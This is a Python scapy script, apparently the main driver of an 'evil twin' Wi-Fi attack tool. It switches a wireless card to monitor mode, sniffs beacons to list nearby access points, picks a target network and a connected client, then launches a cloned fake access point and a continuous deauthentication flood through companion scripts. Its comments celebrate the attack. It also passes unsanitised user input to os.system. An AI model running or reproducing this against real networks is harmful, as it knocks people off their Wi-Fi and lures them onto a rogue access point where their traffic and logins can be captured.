import os
import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt 
#from playsound import playsound
#bellla rafooffox


# import json

ap_list = []
### Coloum indices for 'ap_list'. 
ESSID = 0
BSSID = 1
CHANNEL = 2
essids_set = set()

client_list = []


### Console colors
W  = '\033[0m'  # white 
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan



##############################################
############### Interface Mode ###############
##############################################

### In this function the user choose the interface that will scan the network and send the deauthentication packets. 
### In order to do so, we need to switched this interface to 'monitor mode'. 
def monitor_mode():
    global interface
    print(R + r"""   
 ███▄    █ ▒█████ ▄▄▄█████▓
 ██ ▀█   █▒██▒  ██▓  ██▒ ▓▒
▓██  ▀█ ██▒██░  ██▒ ▓██░ ▒░
▓██▒  ▐▌██▒██   ██░ ▓██▓ ░ 
▒██░   ▓██░ ████▓▒░ ▒██▒ ░ 
░ ▒░   ▒ ▒░ ▒░▒░▒░  ▒ ░░   
░ ░░   ░ ▒░ ░ ▒ ▒░    ░    
   ░   ░ ░░ ░ ░ ▒   ░      
         ░    ░ ░          
                           """)
    print(R + r"""▓███████▒   █▓██▓██▓    
▓█   ▓██░   █▓██▓██▒    
▒███  ▓██  █▒▒██▒██░    
▒▓█  ▄ ▒██ █░░██▒██░    
░▒████▒ ▒▀█░ ░██░██████▒
░░ ▒░ ░ ░ ▐░ ░▓ ░ ▒░▓  ░
 ░ ░  ░ ░ ░░  ▒ ░ ░ ▒  ░
   ░      ░░  ▒ ░ ░ ░   
   ░  ░    ░  ░     ░  ░
          ░             """)
          
          # Play the mp3 file
    #playsound('PlayMeLikeThatVideoGame.mp3')

    empty = input(P + "Welcome to the Not 3vil Tw1n Area. To start the show press Enter\n")
    print(W)
    os.system('ifconfig')
    interface = input(G + "~~Choose which interface you want to put in 'monitor mode'.~~~\n")
    print(W)
    # Put the choosen interface in 'monitor mode'
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode monitor')
    os.system('ifconfig ' + interface + ' up')



### After we finish our attack, we want to switch back the interface to 'managed mode'. 
def managed_mode():
    print(G + "\n*** Lets Back to Safe place *** \n")
    empty = input ("Press Enter to put " + interface + " in 'managed mode' .........")
    print(W)
    # Put the choosen interface back in 'managed mode'
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode managed')
    os.system('ifconfig ' + interface + ' up')
    print(B + "[**] - The interface: " + interface + ", is now in Managed Mode. \nYou can check it here : \n")
    os.system('iwconfig')




##############################################
############### APs Scanning #################
##############################################



                                         
### In this fucntion we scan the network for nearby access points. 
### We present to the user all the APs that were found, and he choose which AP he want to attack. 
def ap_scan():
    print(G + "~~~ Scanning the network.. ~~~ \n")
    global search_timeout
    search_timeout = int(input(G + "Enter How Much Seconds U Want To Scan: "))
    channel_changer = Thread(target = change_channel)
    # A daemon thread runs without blocking the main program from exiting
    channel_changer.daemon = True
    channel_changer.start()
    print("\n Scanning for networks...\n")
    # Sniffing packets - scanning the network for AP in the area
    # iface – the interface that is in monitor mode
    # prn – function to apply to each packet
    # timeout – stop sniffing after a given time
    sniff(iface = interface, prn = ap_scan_pkt, timeout=search_timeout)
    num_of_ap = len(ap_list)
    # If at least one AP was found, print all the found APs
    if num_of_ap > 0: 
        # If at least 1 AP was found. 
        print("\n*************** APs Table ***************\n")
        for x in range(num_of_ap):
            print("[" + str(x) + "] - BSSID: " + ap_list[x][BSSID] + " \t Channel:" + str(ap_list[x][CHANNEL]) + " \t AP name: " + ap_list[x][ESSID]) 
        print("\n************* FINISH SCANNING *************\n")
        # Choosing the AP to attack
        ap_index = int(input("Enter the number of the AP you want to attack: "))
        # Print the choosen AP
        print("You choose the AP: [" + str(ap_index) + "] - BSSID: " + ap_list[ap_index][BSSID] + " Channel:" + str(ap_list[ap_index][CHANNEL]) + " AP name: " + ap_list[ap_index][ESSID])
        # Set the channel as the choosen AP channel in order to send packets to connected clients later
        set_channel(int(ap_list[ap_index][CHANNEL]))
        # Save all the needed information about the choosen AP
        global ap_mac
        global ap_name
        global ap_channel
        ap_mac = ap_list[ap_index][BSSID]
        ap_name = ap_list[ap_index][ESSID]
        ap_channel = ap_list[ap_index][CHANNEL]
        '''
        data = {}
        data['AP'] = []
        data['AP'].append({
            'name': ap_name,
            'chnnel': ap_channel,
            'mac': ap_mac
            })
        with open('data.txt', 'w') as outfile:
            json.dump(data, outfile)
            '''
        # client_scan_rap()
    else: 
        # If no AP was found. 
        rescan = input("No networks were found. Do you want to rescan? [Y/N] ")
        if rescan == 'N' or rescan == 'n':
            print(" /\/\/\ Goodbye Deamon /\/\/\ ")
            managed_mode()
            sys.exit(0)
        elif rescan == 'Y' or rescan == 'y':
                ap_scan()
        else:
            print(C + "You enter incorrect input so my spirit told me to exit")
            managed_mode()
            sys.exit(0)



### In order to scan the network for multiple APs we need to check with each channel in the range [1,14]. 
### Usually routers will use the 2.4GHz band with a total of 14 channels. 
### (In reality it may be 13 or even less that are used around the world) 
def change_channel():
    channel_switch = 1
    while True:
        os.system('iwconfig %s channel %d' % (interface, channel_switch))
        # switch channel in range [1,14] each 0.5 seconds
        channel_switch = channel_switch % 14 + 1
        time.sleep(0.5)


### After the user choose the AP he want to attack, we want to set the interface's channel to the same channel as the choosen AP. 
def set_channel(channel):
    os.system('iwconfig %s channel %d' % (interface, channel))

### Dot11 represent the MAC header, it is the abbreviated specification name 802.11
### Dot11Elt layers is where we put the necessary information: SSID, supported speeds (up to eight), additional supported speeds, channel used.
### Dot11Beacon represents an IEEE 802.11 Beacon

### sniff(..., prn = ap_scan_pkt, ...) 
### The argument 'prn' allows us to pass a function to apply to each packet sniffed
def ap_scan_pkt(pkt):
    # We are interested only in Beacon frame
    # Beacon frames are transmitted periodically, they serve to announce the presence of a wireless LAN
    if pkt.haslayer(Dot11Beacon):
        # Get the source MAC address - BSSID of the AP
        bssid = pkt[Dot11].addr2
        # Get the ESSID (name) of the AP
        essid = pkt[Dot11Elt].info.decode()
        # Check if the new found AP is already in the AP set
        if essid not in essids_set:
            essids_set.add(essid)
            # network_stats() function extracts some useful information from the network - such as the channel
            stats = pkt[Dot11Beacon].network_stats()
            # Get the channel of the AP
            channel = stats.get("channel")
            # Add the new found AP to the AP list
            ap_list.append([essid, bssid, channel])
            # print("AP name: %s,\t BSSID: %s,\t Channel: %d." % (essid, bssid, channel))




##############################################
############# Clients Scanning ###############
##############################################

### Rapper function for 'client_scan()'. 
def client_scan_rap():
    empty = input(G + "\n*** Press Enter for Checking if there are clients on the target*** \n")
    print(W)
    # os.system('airodump-ng ' + interface + ' --bssid ' + ap + ' --channel ' + channel)
    client_scan()
    print("\n")


### In this fucntion we scan the network for clients who are connected to the choosen AP. 
### We present to the user all the clients that were found, and he choose which client he want to attack. 
def client_scan():
    # We need the client to send packet to the AP and it may take time, so we double the scan time
    s_timeout = search_timeout * 2
    print(G + "\nScanning for clients that connected to: " + ap_name + " ...")
    '''
    channel_changer = Thread(target=change_channel)
    # A daemon thread runs without blocking the main program from exiting
    channel_changer.daemon = True
    channel_changer.start()
    '''
    # Sniffing packets - scanning the network for clients which are connected to the choosen AP 
    sniff(iface=interface, prn=client_scan_pkt, timeout=s_timeout)
    num_of_client = len(client_list)
    # If at least one client was found, print all the found clients
    if num_of_client > 0: 
        # If at least 1 client was found. 
        print("\n*************** Clients Table ***************\n")
        for x in range(num_of_client):
            print("[" + str(x) + "] - "+ client_list[x])
        print("\n************** FINISH SCANNING **************\n")
        # Choosing the AP to attack
        client_index = input("Enter your favorite number of the client you want to attack. To rescan inset 'R': ")
        if client_index == 'R' or client_index == 'r':
            # Rescan
            client_scan()
        elif client_index.isnumeric():
            # Client was choosen
            # Print the choosen AP
            print("You choose the client: [" + client_index + "] - "+ client_list[int(client_index)])
            global client_mac
            # Save the needed information about the choosen client
            client_mac = client_list[int(client_index)]
            # deauth_attack()
    else: 
        # If no client was found. 
        rescan = input("No clients were found. Do you want to rescan? [Y/N] ")
        if rescan == 'N' or rescan == 'n':
            print(" /\/\/\  Goodbye Deamon /\/\/\ ")
            managed_mode()
            sys.exit(0)
        elif rescan == 'Y' or rescan == 'y':
            client_scan()
        else:
            print(C + "You enter incorrect input so my spirit told me to exit")
            managed_mode()
            sys.exit(0)


  

### sniff(..., prn = client_scan_pkt, ...) 
### The argument 'prn' allows us to pass a function that executes with each packet sniffed 
def client_scan_pkt(pkt):
    global client_list
    # We are interested in packets that send from the choosen AP to a client (not broadcast)
    # ff:ff:ff:ff:ff:ff - broadcast address 
    if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in client_list:
            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                # Add the new found client to the client list
                client_list.append(pkt.addr1)
                print(B + "Let Fishing..\n")
                print("Client with MAC address: " + pkt.addr1 + " was found.")






##############################################
########## Deauthentication Attcak ###########
##############################################

### In this fucntion we ATTACK. YAY!
### We send the deauthentication packets between the choosen AP and client. 
def deauth_attack():
    print("\n*** Disconnect the connection between the AP from the client. *** \n")
    print(R + "---- Let the show begun ~~~ . \n")
    print(G + "Sending DDos Packets attack\n To stop press 'Ctrl+C' ")
    empty = input (O + "To start sending the Deauthentication packets press Enter")
    print(W)
    # Open a new terminal for 'fake_ap.py'
    os.system('gnome-terminal -- sh -c "python3 fake_ap.py "' +  ap_name)
    # In the current terminal we will send non-stop deauthentication packets
    os.system('python3 deauth.py ' + client_mac + ' ' + ap_mac + ' ' + interface)


######################

if __name__ == "__main__":
    
    if os.geteuid():
        sys.exit(R + '[**] Please run as root')

    print(R + "V.666\n")
	
    
    ### Step 1: Choosing the interface for monitoring, and put it in monitor mode. 
    monitor_mode()

    ### Step 2: Choosing the AP that we want to attack.
    ap_scan()

    ### Step 3: Choosing the AP for the attack and Check if that AP have any clients that connected to it.
    client_scan_rap()
    
    ### Step 4: Running the deauthentication script.
    deauth_attack()
    
    ### Step 5: Put the interface back in managed mode  
    managed_mode()
    
    



